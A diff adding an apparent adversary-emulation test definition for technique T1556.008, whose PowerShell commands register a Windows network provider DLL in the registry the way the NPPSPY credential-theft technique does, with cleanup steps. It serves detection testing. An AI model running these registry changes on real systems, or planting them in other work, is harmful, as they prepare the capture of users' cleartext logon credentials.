@@ -1,0 +1,31 @@
+attack_technique: T1556.008
+display_name: 'Modify Authentication Process: Network Provider DLL'
+atomic_tests:
+- name: Register Malicious Network Provider DLL (NPPSPY)
+  auto_generated_guid: 734ee14f-e1fa-4b39-8462-787780df6e5c
+  description: |
+    Registers a network provider in the registry the way the NPPSPY credential-theft technique does: it creates HKLM\SYSTEM\CurrentControlSet\Services\<name>\NetworkProvider with a ProviderPath pointing at a DLL, and prepends the provider to HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order\ProviderOrder. At the next interactive logon, mpnotify.exe would hand the registered provider cleartext credentials. This test only performs the registry registration (it does not ship a real capturing DLL) so it is safe and reversible; cleanup removes the registry keys. Requires administrative privileges.
+  supported_platforms:
+  - windows
+  input_arguments:
+    provider_name:
+      description: Name of the network provider service to register
+      type: string
+      default: AtomicNP
+    dll_path:
+      description: Path the malicious network provider DLL would be loaded from
+      type: path
+      default: C:\Windows\Temp\AtomicNPProvider.dll
+  executor:
+    command: |
+      New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\#{provider_name}\NetworkProvider" -Force | Out-Null
+      New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\#{provider_name}\NetworkProvider" -Name "ProviderPath" -Value "#{dll_path}" -PropertyType ExpandString -Force | Out-Null
+      $order = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER).PROVIDERORDER
+      Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER -Value ("#{provider_name}," + $order)
+      Write-Host "Registered network provider #{provider_name} -> #{dll_path}"
+    cleanup_command: |
+      $order = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER).PROVIDERORDER
+      Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER -Value (($order -split ',' | Where-Object { $_ -ne "#{provider_name}" }) -join ',')
+      Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\#{provider_name}" -Recurse -Force -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
